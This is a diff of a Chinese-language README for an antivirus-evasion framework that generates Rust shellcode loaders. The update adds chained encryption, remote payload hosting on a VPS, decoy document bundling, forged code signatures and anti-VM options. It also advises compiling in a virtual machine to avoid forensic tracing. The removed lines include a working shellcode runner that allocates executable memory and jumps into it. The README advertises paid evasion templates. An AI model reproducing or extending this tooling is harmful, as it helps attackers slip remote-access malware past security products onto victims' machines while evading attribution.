@@ -1,4 +1,4 @@
-## Myosotis-免杀框架-1.0.0
+## Myosotis-免杀框架-1.1.0
 
 ### 简介
 
@@ -6,7 +6,22 @@
 
 通过模块化一个完整loader的各个功能，自动组装模块生成免杀项目；
 
-通过模块导入功能实现模块私有化，增加loader寿命。
+通过模块导入功能实现模块私有化，增加loader寿命；
+
+添加链式加密后加密方式更加灵活，可交叉生成更多模板，同时加解密模板统一输入输出方便读者自行编写模板导入。
+
+本次更新加入链式加密，通过排列组合可产生的加密链条成几何倍数增加，知识星球内11种加密方式理论上可以产生上亿条加密链条
+
+![图片](https://github.com/user-attachments/assets/6f3c5f49-520a-4b9e-a9b2-f02ac0afb7b4)
+
+
+### 已知问题
+
+1、首次使用由于rust需要下载库，因此可能卡住几分钟，换源耐心等待即可,加载过的库后续使用就很快了。
+
+2、链式加密可能导致项目失败，推荐使用成熟的加密算法有bug可手动调试项目或提issue。
+
+3、尽管已经去掉项目调试信息，但部分库仍然会将机器路径带到exe中，建议虚拟机编译使用谨防溯源。
 
 ### 更新功能
 
@@ -16,7 +31,13 @@
 
 ·模板导入检测
 
+·链式加密
+
 ### 编译环境
+
+环境问题参考网上安装教程即可
+
+`Visual Studio 2022(集成mingw64)`
 
 `rustc 1.83.0 (90b35a623 2024-11-26)`
 
@@ -30,19 +51,21 @@ output.log:日志方便排查问题
 
 ### 项目功能
 
-运行主程序选择相关参数，即可在`output`目录下生成rust项目
+运行主程序选择相关参数，即可在`output`目录下生成`rust`项目，编译好的程序在`\output\随机项目名\target\release\`
+
+考虑到免杀的及时性，项目内仅提供部分基础加密加载模板，有rust基础可自行编写模板，或选择文末加入我的知识星球获取更多模板
 
 ```
 基础配置：
 shellcode：各个远控生成的二进制shellcode(必选)
 单体加载：生成单文件exe项目
 分离加载：在项目目录下生成encryption.bin,使用时exe直接跟加密文件即可，可重命名
-远程加载：填写远程加载url，在项目目录下会生成encryption.bin，然后将encryption.bin放到对应vps即可
+远程加载：填写远程加载url，在项目目录下会生成encryption.bin，然后将encryption.bin放到对应vps即可，文件名和填写的url对应
 
 代码配置：
 代码分类用于对部分loader只支持特定系统以及进程注入的路径进行自定义
 加载方式：主要是选择执行shellcode的模板(必选)
-加密方式：选择对shellcode的加密方式(必选)
+加密方式：选择对shellcode的加密链，先选先加密（至少选一个）
 反虚拟机：反沙箱和分析等，也可以加入自己的小功能(可选、可多选)
 花指令：增加代码混淆等(可选、可多选)
 
@@ -51,15 +74,13 @@ shellcode：各个远控生成的二进制shellcode(必选)
 捆绑文件：需要释放的word或pdf等(可选)
 伪造签名：利用签名复制工具sigthief实现(可选)
 ```
-
-![主界面](https://github.com/user-attachments/assets/698401a7-a443-4d26-adaa-1b7aa397fe0e)
+![图片](https://github.com/user-attachments/assets/b5f97d03-12d9-4b74-9a5c-bc2e4c45cfa4)
 
 
 模板导入：
 
 模板导入检测功能已更新，简单检测几个关键点,新增加载模板分类，主要为了对进程注入类注入进程进行自定义以及部分加载方式只适合单个架构的方式，如：Early Bird等
-
-![模板导入](https://github.com/user-attachments/assets/f10b4b49-f4cd-4d66-a295-012084c4d77f)
+![图片](https://github.com/user-attachments/assets/42aa2a14-2bab-4967-9f21-92d3370ebbdf)
 
 
 ### 模板导入说明
@@ -79,9 +100,7 @@ base64 = "0.21"
 
 加密模板：
 
-需要将解密pub函数放到最前
-
-需要导入主要代码，其中加密函数为`pub`，读取加密文件输出到`./encryption.bin`，输入文件以`#shellcodepath#`代替，注意这里需要r保证路径正确
+需要导入主要代码，其中加密函数为`pub`且只有这一个`pub`方法，输入`&[u8]`,输入`Vec<u8>`
 
 例：	
 
@@ -90,33 +109,18 @@ use base64::encode;
 use std::fs::File;
 use std::io::{self, Read, Write};
 
-pub fn base64_encrypt() -> io::Result<()> {
-    // 硬编码的输入和输出路径
-    let input_file = r"#shellcodepath#"; // 输入文件路径
-    let output_file = "./encryption.bin"; // 输出文件路径
-
-    // 读取文件内容
-    let mut file = File::open(input_file)?;
-    let mut buffer = Vec::new();
-    file.read_to_end(&mut buffer)?;
-
+pub fn base64_encrypt(input: &[u8]) -> Vec<u8> {
     // 执行 base64 编码
-    let encoded = encode(buffer);
-
-    // 将编码后的数据写入输出文件
-    let mut output = File::create(output_file)?;
-    output.write_all(encoded.as_bytes())?;
-
-    Ok(())
+    let encoded = encode(input);
+    
+    // 返回编码后的字节数组
+    encoded.into_bytes()
 }
-other...
 ```
 
 解密模板：
 
-需要将解密pub函数放到最前
-
-方法需要为`pub`方法，函数输入输出需要固定为`input_data: &[u8]`和`Vec<u8>`
+需要导入主要代码，其中加密函数为`pub`且只有这一个`pub`方法，输入`&[u8]`,输入`Vec<u8>`
 
 ```rust
 use base64::decode;
@@ -125,9 +129,8 @@ use std::io::{self, Read};
 
 pub fn base64_decrypt_to_shellcode(input_data: &[u8]) -> Vec<u8> {
     // 将 Base64 编码的数据解码为字节数组
-    decode(input_data).expect("Failed to decode Base64")
+    decode(input_data).expect("")
 }
-other...
 ```
 
 #### 加载模板
@@ -154,36 +157,11 @@ use winapi::um::winnt::{MEM_COMMIT, PAGE_EXECUTE_READWRITE};
 
 /// 分配可执行内存并运行 base
 unsafe fn execute_base(base: &[u8]) {
-    // 分配可执行内存
-    let exec_mem = VirtualAlloc(
-        null_mut(),
-        base.len(),
-        MEM_COMMIT,
-        PAGE_EXECUTE_READWRITE,
-    );
-
-    if exec_mem.is_null() {
-        panic!("Failed to allocate executable memory");
-    }
-
-    // 将 base 拷贝到分配的内存中
-    std::ptr::copy_nonoverlapping(base.as_ptr(), exec_mem as *mut u8, base.len());
-
-    // 创建指向 base 的函数指针
-    let base_fn: extern "C" fn() = std::mem::transmute(exec_mem);
-
-    // 执行 base
-    base_fn();
+//你的加载代码
 }
-
 fn main() {
-    println!("Decoding and executing base...");
-
     let base_en: &[u8] =#encryption_shellcode#;
-    // 解码 Base64 base
     let base = #encryption#(base_en);
-
-    // 执行 base
     unsafe {
         execute_base(&base);
     }
@@ -210,33 +188,7 @@ use rand::Rng;
 use std::{thread, time};
 
 pub fn calculate_pi() -> f64 {
-    let start_time = std::time::Instant::now();
-    
-    let mut inside_circle = 0;
-    let total_points = 1_000_000_000;  // 总共生成的点数
-    
-    let mut rng = rand::thread_rng();
-
-    // 计算直到运行大约10秒
-    for i in 0..total_points {
-        let x: f64 = rng.gen_range(0.0..1.0);
-        let y: f64 = rng.gen_range(0.0..1.0);
-        
-        // 检查点是否在单位圆内
-        if x * x + y * y <= 1.0 {
-            inside_circle += 1;
-        }
-
-        // 检查是否达到约定的10秒
-        if start_time.elapsed() >= time::Duration::new(10, 0) {
-            break;
-        }
-    }
-
-    // 计算圆周率
-    let pi_approximation = 4.0 * (inside_circle as f64) / (total_points as f64);
-    println!("近似计算的圆周率: {}", pi_approximation);
-    pi_approximation
+//你的花指令模板和反虚拟机代码
 }
 ```
 
@@ -254,17 +206,21 @@ use windows_sys::Win32::System::Memory::{
 
 这会导致识别失败，同一个导入只占用一行
 
+### 部分生成模板免杀测试
+
+![图片](https://github.com/user-attachments/assets/c1892c88-c3c7-422d-b43e-9f2c286f1f9b)
 
 
-尽管已经去掉项目调试信息，但部分库仍然会将机器路径带到exe中，建议虚拟机使用谨防溯源
+![图片](https://github.com/user-attachments/assets/e61cd26c-241d-46ea-ac5f-7a3359559e95)
+
 
 todo：
 
 日志功能(🐕
 
-动态密钥功能
+动态密钥功能（由于各个加密方式密钥有区别，建议在加密模板中添加生成密钥，然后在解密模板中包含
 
-链式加密模板
+链式加密模板(🐕
 
 加载模板分类（🐕
 
@@ -278,9 +234,10 @@ todo：
 
 如果你没有rust基础，我的知识星球内提供多个免杀模板和加密模板，并会持续维护，欢迎加入！
 
-![知识星球](https://github.com/user-attachments/assets/4b22530f-e951-4760-baef-4552b830e186)
+![图片](https://github.com/user-attachments/assets/fe92f487-c3e9-4035-adff-24c7a663a10e)
 
 
-![知识星球2](https://github.com/user-attachments/assets/64e2b96b-6c1f-4d6b-912c-f94e394be9f0)
+![图片](https://github.com/user-attachments/assets/dc6e00ad-1d63-4b92-9d28-1970e7aa7c0e)
 
-![海报](https://github.com/user-attachments/assets/303d031b-ade9-4849-8a07-db1ceb705a9a)
+
+![图片](https://github.com/user-attachments/assets/e9330252-ecd2-4676-b443-2741f993ae13)
